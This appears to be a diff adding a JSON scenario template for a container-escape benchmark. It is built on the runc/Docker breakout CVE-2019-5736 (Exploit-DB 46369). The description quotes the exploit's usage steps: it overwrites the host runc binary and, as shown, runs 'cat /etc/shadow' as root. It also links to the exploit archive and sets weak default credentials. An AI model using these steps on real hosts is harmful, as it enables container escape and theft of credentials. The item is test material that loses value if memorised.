@@ -1,0 +1,32 @@
+{
+  "template_id": "auto_edb_46369",
+  "category": "E1_docker_escape",
+  "attack_technique": "T1611",
+  "cwe": "CWE-268",
+  "description": "Linux privilege escalation: runc < 1.0-rc6 (Docker < 18.09.2) - Container Breakout (2) (CVE-2019-5736)\n\nExploit source code (46369.md):\n```\n## CVE-2019-5736 ##\n\nThis is exploit code for CVE-2019-5736 (and it works for both runc and LXC).\nThe simplest way to use it is to copy the exploit code into an existing\ncontainer, and run `make.sh`. However, you could just as easily create a bad\nimage and run that.\n\n```console\n% docker run --rm --name pwnme -dit ubuntu:18.10 bash\npwnme\n% docker cp CVE-2019-5736.tar pwnme:/CVE-2019-5736.tar\n```\n\nWe need to install `gcc` to build the exploit, and `runc` because we need to\nhave the shared libraries that `runc` would use. We don't actually use the\n`runc` binary itself. For LXC, you would install `lxc` instead of `runc`.\n\n```console\n% docker attach pwnme\n# apt-get update && apt-get install -y gcc runc\n[ snip ]\n# tar xf CVE-2019-5736.tar\n# ./CVE-2019-5736/make.sh\n```\n\nAnd now, `/bin/bash` in the container will be able to **overwrite the host runc\nbinary**. Since this binary is often executed by `root`, this allows for\nroot-level code execution on the host.\n\n```\n% docker exec -it pwnme /bin/bash\n[+] bad_libseccomp.so booted.\n[+] opened ro /proc/self/exe <3>.\n[+] constructed fdpath </proc/self/fd/3>\n[+] bad_init is ready -- see </tmp/bad_init_log> for logs.\n[*] dying to allow /proc/self/exe to be unused...\n% cat /usr/sbin/docker-runc\n#!/bin/bash\ntouch /w00t_w00t ; cat /etc/shadow\n```\n\nAnd now if you try to use Docker normally, the malicious script will execute\nwith root privileges:\n\n```\n% docker exec -it pwnme /bin/good_bash\nOCI runtime state failed: invalid character 'b' looking for beginning of value: unknown\n% file /w00t_w00t\n/w00t_w00t: empty\n```\n\nAnd obviously `make.sh` can be modified to make the evil path anything you\nlike. If you want to get access to the container, use `/bin/good_bash`.\n\n### License ###\n\n```\nCopyright (C) 2019 Aleksa Sarai <cyphar@cyphar.com>\nVulnerability discovered by Adam Iwaniuk and Borys Popławski.\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to\ndeal in the Software without restriction, including without limitation the\nrights to use, copy, modify, merge, publish, distribute, sublicense, and/or\nsell copies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\n* The above copyright notice and this permission notice shall be included in\n  all copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\nFROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS\nIN THE SOFTWARE.\n```\n\n\nDownload: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/46369.zip\n```",
+  "cve": "CVE-2019-5736",
+  "exploitdb_id": "46369",
+  "feasibility": "L2",
+  "docker_run_args": [
+    "--privileged"
+  ],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_46369",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
